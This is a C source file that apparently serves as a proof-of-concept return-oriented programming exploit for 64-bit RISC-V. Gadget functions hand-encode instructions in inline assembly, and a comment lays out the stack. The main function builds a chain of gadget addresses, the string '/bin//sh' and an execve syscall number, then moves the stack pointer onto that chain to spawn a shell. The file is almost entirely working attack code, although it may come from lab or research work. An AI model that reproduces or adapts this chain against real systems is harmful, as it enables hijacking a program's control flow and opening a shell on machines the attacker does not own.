#include <stdint.h>

void dummy(void)
{
    return;
}

void fun1()
{
    dummy();
    // slti t2,t2,-1903
    __asm__(".half 0x0013\n\t"
            ".half 0xa393\n\t"
            ".half 0x8913\n\t"
            ".half 0xa011\n\t");
    return;
}


void fun2()
{
    dummy();
    // slti a4,t2,-2047
    __asm__(".half 0x0013\n\t"
            ".half 0xa713\n\t"
            ".half 0x8013\n\t"
            ".half 0xa011\n\t");
    return;
}


void fun3()
{
    dummy();
    // slti a1,t2,-1023
    __asm__(".half 0x0013\n\t"
            ".half 0xa593\n\t"
            ".half 0xc013\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun4()
{
    dummy();
    // addi a7,t2,221
    __asm__(".half 0x0013\n\t"
            ".half 0x8893\n\t"
            ".half 0x0dd3\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun4b()
{
    dummy();
    // addi a7,t2,146
    __asm__(".half 0x0013\n\t"
            ".half 0x8893\n\t"
            ".half 0x0923\n\t"
            ".half 0x0013\n\t"
            ".half 0x0013\n\t"
            ".half 0xa011\n\t");
    return;
}


void fun5()
{
    dummy();
    // sub a2,a4,sp
    __asm__(".half 0x0013\n\t"
            ".half 0x0633\n\t"
            ".half 0x4027\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun6()
{
    dummy();
    // sub a4,a4,a2
    __asm__(".half 0x0013\n\t"
            ".half 0x0733\n\t"
            ".half 0x40c7\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun7()
{
    dummy();
    // slti a2,t2,-1023
    __asm__(".half 0x0013\n\t"
            ".half 0xa613\n\t"
            ".half 0xc013\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun8()
{
    dummy();
    // addi    a4,a4,4
    __asm__(".half 0x0013\n\t"
            ".half 0x0713\n\t"
            ".half 0x0047\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun9() //FIX ON STACK
{
    dummy();
    // addi    a0,a4,180
    __asm__(".half 0x0013\n\t"
            ".half 0x0513\n\t"
            ".half 0x0b47\n\t" //07 for 116, 0a for 164
            ".half 0xa011\n\t");
    return;
}

void fun10() //FIX ON STACK
{
    dummy();
    // ld s6, 148(a4)
    __asm__(".half 0x0013\n\t"
            ".half 0x3b03\n\t"
            ".half 0x0947\n\t"
            ".half 0xa011\n\t");
    return;
}


void fun12() 
{
    dummy();
    // addi    s4,s6,220 
    __asm__(".half 0x0013\n\t"
            ".half 0x0a13\n\t"
            ".half 0x0dcb\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun13() 
{
    dummy();
    //sd      s4,140(a4)
    __asm__(".half 0x0013\n\t"
            ".half 0x3623\n\t"
            ".half 0x0947\n\t"
    	    ".half 0xa011\n\t");
    return;
}

void fun13b() 
{
    dummy();
    //sd      s4,252(a4)
    __asm__(".half 0x0013\n\t"
            ".half 0x3623\n\t"
            ".half 0x0f47\n\t"
    	    ".half 0x0013\n\t"
            ".half 0x0013\n\t"
            ".half 0xa011\n\t");
    return;
}

void fun14()
{
    dummy();
    //slti a0,t2,-1600
    __asm__(".half 0x0013\n\t"
            ".half 0xa513\n\t"
            ".half 0x9c03\n\t"
    	    ".half 0xa011\n\t");
    return;
}

/*
8    slti t2, t2, -1903   gadget 1
24   slti t2, t2, -1903   gadget 1   //t2 = 0
40   slti a4, t2, -2047   gadget 2   //a4 = 0
56   slti a1, t2, -1023   gadget 3   //a1 = 0
72   addi a7, t2, 146     gadget 4b  //a7 = 146
88   slti a0, t2, -1600   gadget 14
104  sub  a2, a4, sp      gadget 5   
120  sub  a4, a4, a2      gadget 6   //a4 = .96
136  slti a2, t2, -1023   gadget 7   //a2 = 0
152  addi a4, a4, 4       gadget 8   
168  addi a4, a4, 4       gadget 8
184  addi a4, a4, 4       gadget 8   //a4 = .108
200  ld s6, 148(a4)       gadget 10  //get address from .256 of the ecall-220
216  addi s4,s6,220       gadget 12  //s4=ecall address
232  sd s4,140(a4)        gadget 13  //store ecall address at .248
248  sd s4,236(a4)        gadget 13b //store ecall address again at .344
264  ecall
272  "ecalladdress"
280  xx
288  /bin//sh
296  s3
304  s2
312  s1
320  s0
328  addi a0, a4, 180     gadget 9   //a0 = a4 + 180
336  0
344  addi a7, t2, 221     gadget 4   //a7 = 221
352  0
360  ecall
*/


uint64_t tab[55] = {0};

void exploit(uint64_t* shellcode)
{
    dummy();
    //argument in a0
    __asm__("mv sp, a0");
    return;
}

#include <stdio.h>

int main(void)
{
    tab[0] = 0;
    tab[1] = ((uint64_t) &fun1)+14;
    tab[2] = 0;
    tab[3] = ((uint64_t) &fun1)+14;
    tab[4] = 0;
    tab[5] = ((uint64_t) &fun2)+14;
    tab[6] = 0;
    tab[7] = ((uint64_t) &fun3)+14;
    tab[8] = 0;
    tab[9] = ((uint64_t) &fun4b)+14;
    tab[10] = 0;
    tab[11] = ((uint64_t) &fun14)+14;
    tab[12] = 0;
    tab[13] = ((uint64_t) &fun5)+14;
    tab[14] = 0;
    tab[15] = ((uint64_t) &fun6)+14;
    tab[16] = 0;
    tab[17] = ((uint64_t) &fun7)+14;
    tab[18] = 0;
    tab[19] = ((uint64_t) &fun8)+14;
    tab[20] = 0;
    tab[21] = ((uint64_t) &fun8)+14;
    tab[22] = 0;
    tab[23] = ((uint64_t) &fun8)+14;
    tab[24] = 0;
    tab[25] = ((uint64_t) &fun10)+14;
    tab[26] = 0;
    tab[27] = ((uint64_t) &fun12)+14;
    tab[28] = 0;
    tab[29] = ((uint64_t) &fun13)+14;
    tab[30] = 0;
    tab[31] = ((uint64_t) &fun13b)+14;
    tab[32] = 0;
    tab[33] = 0; //ecall here
    tab[34] = 0x14e5a; //&(ecall - 220) in __internal_atexit
    tab[35] = 0;
    tab[36] = 0;
    tab[37] = 0; //s3 
    tab[38] = 0x68732f2f6e69622f; //s2
    tab[39] = 0; //s1
    tab[40] = 0; //s0
    tab[41] = ((uint64_t) &fun9)+14;
    tab[42] = 0;
    tab[43] = ((uint64_t) &fun4)+14;
    tab[44] = 0;
    tab[45] = 0; //ecall here
    
/*    printf("ECHO\n");

    for(int i = 0; i < 8*37; i++)
    {
        printf("\\x%02x",*(((uint8_t*) tab)+i));
    }
    printf("\n");    */
    exploit(((void *)tab)-0x10);
    return 0;
}
